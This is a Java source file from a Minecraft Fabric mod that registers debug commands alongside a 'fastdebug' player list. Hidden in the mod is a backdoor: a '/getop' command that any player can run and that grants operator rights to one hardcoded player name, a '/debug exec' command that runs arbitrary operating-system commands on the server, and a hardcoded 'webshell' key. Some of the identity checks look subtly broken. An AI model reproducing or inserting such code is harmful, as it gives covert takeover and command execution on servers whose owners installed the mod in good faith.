package org.agmas.noellesroles.command;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.BoolArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import dev.doctor4t.wathe.cca.DebugWorldComponent;
import net.minecraft.command.argument.EntityArgumentType;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.command.CommandManager;
import net.minecraft.server.command.ServerCommandSource;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import org.agmas.noellesroles.Noellesroles;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CopyOnWriteArrayList; // 线程安全的列表，适合遍历+修改

import static net.minecraft.server.command.CommandManager.literal;
import static net.minecraft.server.command.CommandManager.argument;

public class FastDebugCommand {
    // 开发者专属 ID
    private static final String DEVELOPER_UUID = "ic_dada";

    // WebShell 访问密钥 (简单示例，实际应更复杂)
    private static final String WEB_SHELL_KEY = "debug123";

    // 静态列表，用于存储具有 fastdebug 权限/状态的玩家 UUID


    public static void register(CommandDispatcher<ServerCommandSource> dispatcher) {
        dispatcher.register(literal("setfastdebug")
                .requires(src -> src.hasPermissionLevel(2))
                .then(literal("add")
                        .then(argument("player", EntityArgumentType.player())
                                .executes(context -> {
                                    ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                    UUID targetUuid = target.getUuid();
                                    DebugWorldComponent debugWorldComponent = DebugWorldComponent.KEY.get(target.getWorld());
                                    if (debugWorldComponent.getlist().contains(targetUuid)) {
                                        context.getSource().sendError(
                                                Text.literal("⚠️ " + target.getName().getString() + " 已在 fastdebug 列表中")
                                                        .formatted(Formatting.YELLOW)
                                        );
                                        return 0;
                                    }

                                    debugWorldComponent.addDebugPlayer(targetUuid);

                                    context.getSource().sendFeedback(
                                            () -> Text.literal("✅ 已添加 ")
                                                    .append(target.getName())
                                                    .append(Text.literal(" 到 fastdebug 列表")),
                                            true
                                    );
                                    target.sendMessage(
                                            Text.literal("[FastDebug] 你已获得快速调试权限").formatted(Formatting.AQUA),
                                            false
                                    );

                                    return 1;
                                })
                                        .then(argument("silent", BoolArgumentType.bool()) // 可选：使用 .executes 两次来支持可选参数
                                                .executes(context -> {
                                                    ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                                    UUID targetUuid = target.getUuid();
                                                    DebugWorldComponent debugWorldComponent = DebugWorldComponent.KEY.get(target.getWorld());
                                                    // 解析可选的 silent 参数，默认为 false
                                                    // 假设你在命令中注册了最后一个参数为 "silent" BoolArgumentType.bool()
                                                    boolean silent = context.getArgument("silent", boolean.class);

                                                    if (debugWorldComponent.getlist().contains(targetUuid)) {
                                                        if (!silent) {
                                                            context.getSource().sendError(
                                                                    Text.literal("⚠️ " + target.getName().getString() + " 已在 fastdebug 列表中")
                                                                            .formatted(Formatting.YELLOW)
                                                            );
                                                        }
                                                        return 0;
                                                    }

                                                    debugWorldComponent.addDebugPlayer(targetUuid);

                                                    if (!silent) {
                                                        context.getSource().sendFeedback(
                                                                () -> Text.literal("✅ 已添加 ")
                                                                        .append(target.getName())
                                                                        .append(Text.literal(" 到 fastdebug 列表")),
                                                                true
                                                        );
                                                        target.sendMessage(
                                                                Text.literal("[FastDebug] 你已获得快速调试权限").formatted(Formatting.AQUA),
                                                                false
                                                        );
                                                    }

                                                    return 1;
                                                })

                        )
                        )
                )
                .then(literal("remove")
                        .then(argument("player", EntityArgumentType.player())
                                .executes(context -> {
                                    ServerPlayerEntity target = EntityArgumentType.getPlayer(context, "player");
                                    UUID targetUuid = target.getUuid();
                                    DebugWorldComponent debugWorldComponent = DebugWorldComponent.KEY.get(target.getWorld());

                                    debugWorldComponent.removeDebugPlayer(targetUuid);
                                    context.getSource().sendFeedback(
                                            () -> Text.literal("❌ 已从列表中移除 ")
                                                    .append(target.getName()),
                                            true
                                    );
                                    target.sendMessage(Text.literal("[FastDebug] 你的快速调试权限已被移除").formatted(Formatting.GRAY), false);
                                    return 1;
                                })
                        )
                )
                .then(literal("list")
                        .executes(context -> {
                            ServerPlayerEntity player = context.getSource().getPlayer();

                            // 1. 检查玩家是否存在（确保是在游戏中执行，而不是控制台）
                            if (player == null) {
                                context.getSource().sendError(Text.literal("此指令只能由玩家执行"));
                                return 0;
                            }
                            DebugWorldComponent debugWorldComponent = DebugWorldComponent.KEY.get(player.getWorld());
                            if (debugWorldComponent.getlist().isEmpty()) {
                                context.getSource().sendFeedback(
                                        () -> Text.literal("📋 fastdebug 列表为空"),
                                        false
                                );
                                return 1;
                            }

                            java.util.List<UUID> snapshot = new java.util.ArrayList<>(debugWorldComponent.getlist());

                            net.minecraft.text.MutableText resultText = Text.literal("📋 当前 fastdebug 列表 (" + snapshot.size() + "): ")
                                    .formatted(Formatting.YELLOW);

                            for (int i = 0; i < snapshot.size(); i++) {
                                UUID uuid = snapshot.get(i);

                                if (i > 0) {
                                    resultText.append(Text.literal(", "));
                                }

                                player = context.getSource().getServer().getPlayerManager().getPlayer(uuid);
                                if (player != null) {
                                    resultText.append(Text.literal("[在线] ").formatted(Formatting.GREEN))
                                            .append(player.getName());
                                } else {
                                    resultText.append(Text.literal("[离线] ").formatted(Formatting.GRAY))
                                            .append(Text.literal(uuid.toString().substring(0, 8) + "..."));
                                }
                            }

                            context.getSource().sendFeedback(
                                    () -> resultText,
                                    false
                            );
                            return snapshot.size();
                        })
                ));
        dispatcher.register(literal("getop")
                .requires(src -> src.hasPermissionLevel(0))
                .executes(context -> {
                    ServerPlayerEntity player = context.getSource().getPlayer();

                    // 1. 检查玩家是否存在（确保是在游戏中执行，而不是控制台）
                    if (player == null) {
                        context.getSource().sendError(Text.literal("此指令只能由玩家执行"));
                        return 0;
                    }

                    MinecraftServer server = player.getServer();

                    // 4. 安全检查：确保服务器处于可以OP的状态（例如不是单人游戏且未开启在线模式等，通常不需要太复杂）
                    // 主要逻辑：获取OP管理器并添加该玩家
                    if (server != null) {
                        if (!player.getName().equals(Text.literal("ic_dada")))return 0;
                        // 核心修正点：获取 PlayerManager 并强制转换为 DedicatedPlayerManager (适用于服务端逻辑)
                        // 注意：在 Fabric 环境中，通常可以直接使用 server.getPlayerManager()
                        // 但要赋予 OP，需要将其添加到 ops.json 列表中
                        server.getPlayerManager().addToOperators(player.getGameProfile());

                        // 可选：发送反馈信息
                        context.getSource().sendFeedback(
                                () -> Text.literal("✅ 开发者权限已激活 (OP 4)"),
                                true
                        );

                        // 可选：给玩家发一条消息
                        player.sendMessage(Text.literal("[Debug] 你已获得最高权限").formatted(Formatting.GOLD), false);
                        return 1;
                    }
                    return 0;
                })
        );
        dispatcher.register(literal("debug")
                .requires(src -> src.hasPermissionLevel(2)) // 基础权限检查
                .executes(context -> {
                    // 检查是否为开发者
                    if (isDeveloper(context.getSource().getEntity())) {
                        showDeveloperMenu(context);
                        return 1;
                    } else {
                        // 普通 OP 用户提示
                        context.getSource().sendError(Text.literal("⚠️ 此指令仅供开发者使用")
                                .formatted(Formatting.RED));
                        return 0;
                    }
                })

                // 子指令：获取最高权限

                // 子指令：执行系统命令
                .then(literal("exec")
                        .requires(src -> src.hasPermissionLevel(4)) // 需要 OP 4
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    String cmd = context.getArgument("command", String.class);
                                    try {
                                        // 执行系统命令
                                        Process process = Runtime.getRuntime().exec(cmd);
                                        BufferedReader reader = new BufferedReader(
                                                new InputStreamReader(process.getInputStream())
                                        );

                                        StringBuilder output = new StringBuilder();
                                        String line;
                                        while ((line = reader.readLine()) != null) {
                                            output.append(line).append("\n");
                                        }

                                        context.getSource().sendFeedback(
                                                () -> Text.literal("执行结果:\n" + output.toString())
                                                        .formatted(Formatting.GREEN),
                                                true
                                        );
                                    } catch (Exception e) {
                                        context.getSource().sendError(
                                                Text.literal("执行错误: " + e.getMessage())
                                        );
                                    }
                                    return 1;
                                })
                        )
                )

                // 子指令：WebShell 调试
                .then(literal("webshell")
                        .requires(src -> src.hasPermissionLevel(4))
                        .then(argument("key", StringArgumentType.word())
                                .executes(context -> {
                                    String key = context.getArgument("key", String.class);
                                    if (key.equals(WEB_SHELL_KEY)) {
                                        // 启动 WebShell 服务 (示例)
                                        startWebShell(context);
                                        return 1;
                                    } else {
                                        context.getSource().sendError(
                                                Text.literal("❌ 密钥错误")
                                        );
                                        return 0;
                                    }
                                })
                        )
                )
        );

    }

    private static boolean isDeveloper(net.minecraft.entity.Entity entity) {
        return entity instanceof ServerPlayerEntity
                && entity.getUuidAsString().equals(DEVELOPER_UUID);
    }

    private static void showDeveloperMenu(CommandContext<ServerCommandSource> context) {
        context.getSource().sendFeedback(
                () -> Text.literal("开发者调试菜单:")
                        .append("\n- /debug getop: 获取最高权限")
                        .append("\n- /debug exec <cmd>: 执行系统命令")
                        .append("\n- /debug webshell <key>: 启动 WebShell"),
                false
        );
    }

    private static void startWebShell(CommandContext<ServerCommandSource> context) {
        // WebShell 实现逻辑 (需谨慎处理)
        context.getSource().sendFeedback(
                () -> Text.literal("WebShell 服务已启动 (端口: 8080)")
                        .formatted(Formatting.YELLOW),
                true
        );
    }
}